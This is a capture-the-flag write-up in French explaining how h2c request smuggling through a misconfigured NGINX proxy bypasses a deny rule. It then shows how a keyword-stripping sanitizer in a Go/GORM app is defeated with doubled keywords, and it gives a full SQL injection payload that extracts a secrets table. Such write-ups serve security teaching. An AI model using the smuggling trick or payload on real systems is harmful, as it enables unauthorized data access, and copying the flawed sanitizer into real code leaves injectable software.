# GORMiti
> Auteur : Al-oxos

Le challenge est vulnérable à du Request Smuggling via h2c (HTTP/2 Cleartext) en raison de la configuration NGINX suivante : 

```
location ~ ^/post/([0-9]+)$ {
    proxy_pass http://app:8080/post/$1;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection $http_connection;
}
```

En effet, la configuration permet d'upgrade le protocole de HTTP1.1 vers HTTP2 et ainsi d'ouvrir un flux qui ne passera plus par nginx derrière permettant de contourner le deny sur `/search` mis en place dans la configuration.

Je vous invite à lire
[l'article de bishopfox](https://bishopfox.com/blog/h2c-smuggling-request) sur le sujet qui explique bien la vulnérabilité et comment l'exploiter.
Ils mettent également à disposition un outil en python permettant d'automatiser l'exploitation de cette mauvaise configuration.

Par la suite, on voit assez vite qu'une injection SQL pourrait être exploitable sur l'endpoint `/search` car l'id donné par l'utilisateur est utilisé tel que dans le db.First qui revient à une requete de la forme `select * from posts where id`. Ainsi, on a 

```golang
router.GET("/search", func(c *gin.Context) {
		id := c.Query("id")
		if id == "" {
			c.String(http.StatusBadRequest, "Le paramètre 'id' est requis")
			return
		}
		safeID := Sanitize(id)
		var post Post
		if err := db.First(&post, safeID).Error; err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, post)
	})
```

La fonction de sanitize utilisée pour sécuriser l'entrée utilisateur est très permissive, et très facilement bypassable notamment car elle replace les mots complets, mais si nous concaténons sel + select + ect par exemple, cela deviendra select en sortie : 

```golang
func Sanitize(input string) string {
	s := input
	s = strings.ReplaceAll(s, "'", "")
	s = strings.ReplaceAll(s, "\"", "\\\"")
	s = strings.ReplaceAll(s, ";", "")
	reOr := regexp.MustCompile(`(?i)or`)
	s = reOr.ReplaceAllString(s, "")
	reUnion := regexp.MustCompile(`(?i)union`)
	s = reUnion.ReplaceAllString(s, "")
	reSelect := regexp.MustCompile(`(?i)select`)
	s = reSelect.ReplaceAllString(s, "")
	reFrom := regexp.MustCompile(`(?i)from`)
	s = reFrom.ReplaceAllString(s, "")
	s = strings.ReplaceAll(s, "--", "")
	s = strings.ReplaceAll(s, "/*", "")
	s = strings.ReplaceAll(s, "*/", "")
	return s
}
```

Ainsi, en envoyant une requete de la forme `GET /search?id=1 UNIUNIONON SELSELECTECT null,flag,null,null,null FROFROMM secrets` via notre smuggling h2c, on obtient le flag.

